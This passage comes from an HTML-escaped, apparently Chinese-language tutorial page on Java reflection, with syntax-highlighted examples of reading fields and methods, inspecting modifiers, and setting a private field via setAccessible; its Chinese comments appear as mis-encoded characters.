&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ç›¸å½“äºŽ new String()
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="è®¿é—®å­—æ®µ">è®¿é—®å­—æ®µ&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Class&lt;/code>ç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æ¥èŽ·å–å­—æ®µçš„ï¼ˆè¿”å›ž&lt;code>Field&lt;/code>å¯¹è±¡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">stdClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æ ¹æ®å­—æ®µåèŽ·å–æŸä¸ªpublicçš„field(åŒ…æ‹¬çˆ¶ç±»)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;score&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// èŽ·å–publicå­—æ®µ&amp;#34;score&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// èŽ·å–ç»§æ‰¿çš„publicå­—æ®µ&amp;#34;name&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// æ ¹æ®å­—æ®µåèŽ·å–å½“å‰ç±»çš„æŸä¸ªfield(ä¸åŒ…æ‹¬çˆ¶ç±»)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;grade&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// èŽ·å–privateå­—æ®µ&amp;#34;grade&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">score&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">grade&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸€ä¸ª&lt;code>Field&lt;/code>å¯¹è±¡åŒ…å«ä¸€ä¸ªå­—æ®µçš„æ‰€æœ‰ä¿¡æ¯&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¿”å›žå­—æ®µåç§°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// &amp;#34;value&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¿”å›žå­—æ®µç±»åž‹ æ˜¯ä¸€ä¸ªClasså®žä¾‹(æ¯”å¦‚String.class)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getType&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// class [B è¡¨ç¤ºbyte[]ç±»åž‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¿”å›žå­—æ®µçš„ä¿®é¥°ç¬¦ æ˜¯ä¸€ä¸ªint ä¸åŒçš„bitæœ‰ä¸åŒçš„å«ä¹‰
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFinal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPublic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isProtected&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrivate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isStatic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ç”¨&lt;code>Field.get(Object)&lt;/code>å¯ä»¥èŽ·å–æŒ‡å®šå®žä¾‹æŒ‡å®šå­—æ®µçš„å€¼ï¼›å¦‚æžœå­—æ®µä¸º&lt;code>private&lt;/code>å¯ä»¥è°ƒç”¨&lt;code>Field.setAccessible(true)&lt;/code>ï¼Œä¸€å¾‹è®¿é—®ï¼Œå¯èƒ½ä¼šå¤±è´¥çš„åŽŸå› æ˜¯JVMè¿è¡ŒæœŸ&lt;code>SecurityManager&lt;/code>å¯èƒ½ä¸å…è®¸å¯¹&lt;code>java&lt;/code>å’Œ&lt;code>javax&lt;/code>å¼€å¤´çš„packageçš„ç±»è°ƒç”¨&lt;code>setAccessible(true)&lt;/code>ï¼Œä¿æŠ¤JVMæ ¸å¿ƒåº“çš„å®‰å…¨&lt;/li>
&lt;li>åŒæ ·çš„ï¼Œç”¨&lt;code>Field.set(Object, Object)&lt;/code>å¯ä»¥è®¾ç½®å­—æ®µçš„å€¼ï¼Œç¬¬ä¸€ä¸ª&lt;code>Object&lt;/code>å‚æ•°æ˜¯æŒ‡å®šçš„å®žä¾‹ï¼Œç¬¬äºŒä¸ª&lt;code>Object&lt;/code>å‚æ•°æ˜¯å¾…ä¿®æ”¹çš„å€¼&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Xiao Ming&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Xiao Ming&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// ä¿®æ”¹éžpublicå­—æ®µ
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Xiao Hong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Xiao Hong&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="è°ƒç”¨æ–¹æ³•">è°ƒç”¨æ–¹æ³•&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Class&lt;/code>ç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æ¥èŽ·å–æ–¹æ³•çš„ï¼ˆè¿”å›ž&lt;code>Method&lt;/code>å¯¹è±¡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">stdClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// èŽ·å–æŸä¸ªpublicçš„Method(åŒ…æ‹¬çˆ¶ç±»)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getScore&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// èŽ·å–publicæ–¹æ³•getScoreï¼Œå‚æ•°ä¸ºString
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getName&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// èŽ·å–ç»§æ‰¿çš„publicæ–¹æ³•getNameï¼Œæ— å‚æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// èŽ·å–å½“å‰ç±»çš„æŸä¸ªMethod(ä¸åŒ…æ‹¬çˆ¶ç±»)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getGrade&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// èŽ·å–privateæ–¹æ³•getGradeï¼Œå‚æ•°ä¸ºint
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getScore&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getGrade&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">year&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Person&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸€ä¸ª&lt;code>Method&lt;/code>å¯¹è±¡åŒ…å«ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå‡½æ•°åŸºæœ¬åŒä¸Šä¸€ä¸ªä¸‰çº§æ ‡é¢˜&lt;/li>
